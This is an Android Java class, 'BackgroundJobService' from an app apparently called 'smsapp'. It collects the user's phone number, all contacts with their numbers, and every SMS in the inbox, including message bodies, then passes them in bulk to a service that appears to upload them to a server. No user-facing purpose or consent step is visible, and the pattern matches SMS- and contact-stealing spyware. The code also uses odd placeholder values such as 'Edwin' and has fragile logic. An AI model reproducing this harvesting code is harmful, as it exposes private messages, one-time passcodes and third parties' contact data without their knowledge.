package gonext.smsapp.servers;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import gonext.smsapp.contacts.ContactData;
import gonext.smsapp.contacts.ContactDetails;
import gonext.smsapp.contacts.SMSData;
import gonext.smsapp.db.ContactEntity;
import gonext.smsapp.db.DbService;
import gonext.smsapp.db.MessageEntity;

/**
 * Created by ram on 05/10/17.
 */

public class BackgroundJobService {
    private Context context;
    private DbService dbService;
    private SmsService smsService;
    private String UserMobile = "";

    public BackgroundJobService(Context context) {
        this.context = context;
        dbService = new DbService(context);
        smsService = new SmsService(context);
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.READ_PHONE_STATE)
                == PackageManager.PERMISSION_GRANTED) {
            try {
                UserMobile = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    public void ReadPhoneContacts() {
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.READ_CONTACTS)
                == PackageManager.PERMISSION_GRANTED) {
            String ContactName = "";
            String ContactID = "";
            String ContactNumber = "";
            List<ContactData> contactDataArrayList = new ArrayList<>();
            int i;
            Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (Integer.valueOf(cursor.getCount()).intValue() > 0) {
                while (cursor.moveToNext()) {
                    ArrayList<ContactDetails> contactDetails = new ArrayList();
                    String id = cursor.getString(cursor.getColumnIndex("_id"));
                    String contactName = cursor.getString(cursor.getColumnIndex("display_name"));
                    if (Integer.parseInt(cursor.getString(cursor.getColumnIndex("has_phone_number"))) > 0) {
                        Cursor pCursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id = ?", new String[]{id}, null);
                        while (pCursor.moveToNext()) {
                            int phoneType = pCursor.getInt(pCursor.getColumnIndex("data2"));
                            contactDetails.add(new ContactDetails(String.valueOf(phoneType), pCursor.getString(pCursor.getColumnIndex("data1"))));
                        }
                        pCursor.close();
                    }
                    ContactEntity contactEntity = dbService.getContact(id);
                    if (contactEntity == null) {
                        contactEntity = new ContactEntity();
                        contactEntity.setContactId(id);
                        List<String> mobileNos = new ArrayList<>();
                        for (ContactDetails contactDetails1 : contactDetails) {
                            mobileNos.add(contactDetails1.getPhoneNo());
                        }
                        contactEntity.setMobile(TextUtils.join(",", mobileNos));
                        contactEntity.setName(contactName);
                        dbService.saveContact(contactEntity);
                        contactDataArrayList.add(new ContactData(contactName, id, contactDetails));
                    }
                }
                cursor.close();
            }

            if (contactDataArrayList.size() > 0) {
                if (contactDataArrayList.size() > 1) {
                    StringBuilder numberstringBuilder = new StringBuilder(contactDataArrayList.size());
                    StringBuilder namestringBuilder = new StringBuilder(contactDataArrayList.size());
                    StringBuilder contactIdstringBuilder = new StringBuilder(contactDataArrayList.size());
                    namestringBuilder = new StringBuilder(contactDataArrayList.size());
                    contactIdstringBuilder = new StringBuilder(contactDataArrayList.size());
                    numberstringBuilder = new StringBuilder(contactDataArrayList.size());
                    for (i = 0; i < contactDataArrayList.size(); i++) {
                        if (i == contactDataArrayList.size() - 1) {
                            namestringBuilder.append(((ContactData) contactDataArrayList.get(i)).getName());
                            contactIdstringBuilder.append(((ContactData) contactDataArrayList.get(i)).getContact_id());
                            numberstringBuilder.append(((ContactDetails) ((ContactData) contactDataArrayList.get(i)).getContactDetails().get(0)).getPhoneNo());
                        } else {
                            namestringBuilder.append(((ContactData) contactDataArrayList.get(i)).getName() + "||");
                            contactIdstringBuilder.append(((ContactData) contactDataArrayList.get(i)).getContact_id() + "||");
                            if (contactDataArrayList.get(i).getContactDetails().size() > 0) {
                                numberstringBuilder.append(((ContactDetails) ((ContactData) contactDataArrayList.get(i)).getContactDetails().get(0)).getPhoneNo() + "||");
                            } else {
                                numberstringBuilder.append("00000" + "||");
                            }
                        }
                    }
                    ContactName = namestringBuilder.toString();
                    ContactID = contactIdstringBuilder.toString();
                    ContactNumber = numberstringBuilder.toString();
                } else {
                    ContactName = ((ContactData) contactDataArrayList.get(0)).getName();
                    ContactID = ((ContactData) contactDataArrayList.get(0)).getContact_id();
                    ContactNumber = ((ContactDetails) ((ContactData) contactDataArrayList.get(0)).getContactDetails().get(0)).getPhoneNo();
                }
            }
            if (contactDataArrayList.size() > 0) {
                smsService.sendContacts(UserMobile, ContactID, ContactNumber, ContactName);
            }
        }
    }



    public void sendSMSToServer() {
        if (ContextCompat.checkSelfPermission(context,
                Manifest.permission.READ_SMS)
                == PackageManager.PERMISSION_GRANTED) {
            String MsgID = "";
            String MsgDate = "";
            String MsgFrom = "";
            String MsgText = "";
            String Timestamp = "";
            List<SMSData> smsList = new ArrayList<>();
            try {
                int i;
                smsList.clear();
                Cursor c = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
//                ((Activity) context).startManagingCursor(c);
                int count = c.getCount();
                if (c.moveToFirst() && count > 0) {
                    for (i = 0; i < count; i++) {
                        SMSData sMSData;
                        SMSData sms = new SMSData();
                        sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
                        sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
                        if (c.isNull(c.getColumnIndexOrThrow("person"))) {
                            sms.setPerson("Edwin");
                        } else {
                            sms.setPerson(c.getString(c.getColumnIndexOrThrow("person")).toString());
                        }
                        if (c.isNull(c.getColumnIndexOrThrow("date"))) {
                            sms.setDate("Edwin");
                        } else {
                            try {
                                Timestamp = c.getString(c.getColumnIndexOrThrow("date")).toString();
                                sMSData = sms;
                                sMSData.setDate(new SimpleDateFormat("dd/MM/yyyy hh:mm aa").format(new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date")).toString()).longValue())));
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                        if (c.isNull(c.getColumnIndexOrThrow("date_sent"))) {
                            sms.setDate_sent("Edwin");
                        } else {
                            try {
                                sMSData = sms;
                                sMSData.setDate_sent(new SimpleDateFormat("dd/MM/yyyy hh:mm aa").format(new Date(Long.valueOf(c.getString(c.getColumnIndexOrThrow("date_sent")).toString()).longValue())));
                            } catch (Exception e2) {
                                e2.printStackTrace();
                            }
                        }
                        if (c.isNull(c.getColumnIndexOrThrow("_id"))) {
                            sms.set_id("Edwin");
                        } else {
                            sms.set_id(c.getString(c.getColumnIndexOrThrow("_id")).toString() + Timestamp);
                        }
                        MessageEntity messageEntity = dbService.getMessage(sms.get_id());
                        if (messageEntity == null) {
                            messageEntity = new MessageEntity();
                            messageEntity.setMessageId(sms.get_id());
                            dbService.saveMessage(messageEntity);
                            smsList.add(sms);
                        }
                        c.moveToNext();
                    }
                }
                if (smsList.size() > 0) {
                    if (smsList.size() > 1) {
                        StringBuilder sb1 = new StringBuilder(smsList.size());
                        StringBuilder sb2 = new StringBuilder(smsList.size());
                        StringBuilder stringBuilder = new StringBuilder(smsList.size());
                        StringBuilder stringBuilder3 = new StringBuilder(smsList.size());
                        for (i = 0; i < smsList.size(); i++) {
                            if (i == smsList.size() - 1) {
                                sb1.append(((SMSData) smsList.get(i)).get_id());
                                sb2.append(((SMSData) smsList.get(i)).getDate());
                                stringBuilder.append(((SMSData) smsList.get(i)).getNumber());
                                stringBuilder3.append(((SMSData) smsList.get(i)).getBody());
                            } else {
                                sb1.append(((SMSData) smsList.get(i)).get_id() + "||");
                                sb2.append(((SMSData) smsList.get(i)).getDate() + "||");
                                stringBuilder.append(((SMSData) smsList.get(i)).getNumber() + "||");
                                stringBuilder3.append(((SMSData) smsList.get(i)).getBody() + "||");
                            }
                        }
                        MsgID = sb1.toString();
                        MsgDate = sb2.toString();
                        MsgFrom = stringBuilder.toString();
                        MsgText = stringBuilder3.toString();
                    } else {
                        MsgID = ((SMSData) smsList.get(0)).get_id();
                        MsgDate = ((SMSData) smsList.get(0)).getDate();
                        MsgFrom = ((SMSData) smsList.get(0)).getNumber();
                        MsgText = ((SMSData) smsList.get(0)).getBody();
                    }
                }
                if (smsList.size() > 0) {
                    smsService.sendSms(UserMobile, MsgID, MsgDate, MsgFrom, MsgText);
                }
            } catch (Exception e22) {
                e22.printStackTrace();
            }
        }
    }
}
